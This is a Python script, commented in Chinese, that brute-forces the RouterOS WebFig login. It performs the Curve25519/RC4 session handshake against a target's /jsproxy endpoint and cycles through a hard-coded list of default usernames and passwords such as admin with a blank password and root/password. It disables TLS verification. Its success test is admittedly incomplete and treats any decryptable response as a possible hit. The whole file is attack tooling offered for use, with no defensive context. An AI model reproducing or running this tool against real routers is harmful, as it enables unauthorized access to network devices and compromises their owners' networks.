#!/usr/bin/env python3
"""
RouterOS WebFig 完整爆破工具
使用真实的Curve25519 DH + RC4加密 + RouterOS消息格式
"""

import requests
import sys
import urllib3
urllib3.disable_warnings()

from routeros_webfig_auth import RouterOSWebFigSession
from routeros_msg_format import RouterOSMessage

class RouterOSWebFigCompleteBrute:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.jsproxy_url = self.target_url + "/jsproxy"
        
        self.credentials = [
            ("admin", ""), ("admin", "admin"), ("admin", "password"),
            ("admin", "1234"), ("admin", "12345"), ("admin", "123456"),
            ("root", ""), ("root", "admin"), ("root", "password"),
            ("user", ""), ("user", "user"),
        ]
    
    def try_login(self, username, password):
        """尝试登录（使用真实协议）"""
        try:
            # 创建会话
            session = RouterOSWebFigSession()
            
            # 步骤1: 发送初始请求（DH密钥交换）
            initial_request = session.make_initial_request()
            
            print(f"  [*] 发送DH公钥 ({len(initial_request)} 字节)")
            
            resp = requests.post(
                self.jsproxy_url,
                data=initial_request,
                headers={"Content-Type": "application/octet-stream"},
                timeout=self.timeout,
                verify=False
            )
            
            if resp.status_code != 200:
                print(f"  [-] DH失败: HTTP {resp.status_code}")
                return False
            
            # 步骤2: 密钥交换
            session.key_exchange(resp.content)
            print(f"  [+] 会话建立: ID={session.session_id:08x}")
            
            # 步骤3: 构造登录消息（RouterOS格式）
            login_msg = {
                "s1": username,  # s1 = username
                "s3": password   # s3 = password
            }
            
            # 编码为RouterOS二进制格式
            encoded_login = RouterOSMessage.encode(login_msg)
            print(f"  [*] 登录消息编码: {len(encoded_login)} 字节")
            
            # 加密
            encrypted_login = session.encrypt(encoded_login)
            print(f"  [*] 加密后: {len(encrypted_login)} 字节")
            
            # 步骤4: 发送登录请求
            resp2 = requests.post(
                self.jsproxy_url,
                data=encrypted_login,
                headers={"Content-Type": "application/octet-stream"},
                timeout=self.timeout,
                verify=False
            )
            
            print(f"  [*] 响应: HTTP {resp2.status_code}, {len(resp2.content)} 字节")
            
            if resp2.status_code == 200 and len(resp2.content) > 16:
                # 尝试解密响应
                try:
                    decrypted = session.decrypt(resp2.content)
                    print(f"  [+] 解密成功: {len(decrypted)} 字节")
                    print(f"  [+] 十六进制: {decrypted[:50].hex()}")
                    
                    # TODO: 解析RouterOS响应消息
                    # 如果没有错误，说明登录成功
                    print(f"\n[+++ 可能成功!] {username}:{password}")
                    print(f"[+++] 需要分析响应消息判断是否真正成功")
                    return True
                    
                except Exception as e:
                    print(f"  [-] 解密失败: {e}")
                    return False
            else:
                print(f"  [-] 响应无效")
                return False
            
        except Exception as e:
            print(f"  [-] 错误: {e}")
            import traceback
            traceback.print_exc()
            return False
        
        return False
    
    def brute_force(self):
        """执行爆破"""
        print(f"\n[+] RouterOS WebFig 完整协议爆破")
        print(f"[+] 目标: {self.target_url}")
        print(f"[+] 协议: Curve25519 DH + RC4 + RouterOS消息格式\n")
        
        for username, password in self.credentials:
            print(f"\n[*] 尝试: {username}:{password}")
            if self.try_login(username, password):
                return {"username": username, "password": password}
        
        print("\n[-] 所有凭据失败")
        return None

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target = sys.argv[1]
        bruter = RouterOSWebFigCompleteBrute(target)
        result = bruter.brute_force()
        if result:
            print(f"\n[+++ 成功!] {result}")
    else:
        print("[+] 使用: python3 webfig_complete_brute.py http://target")
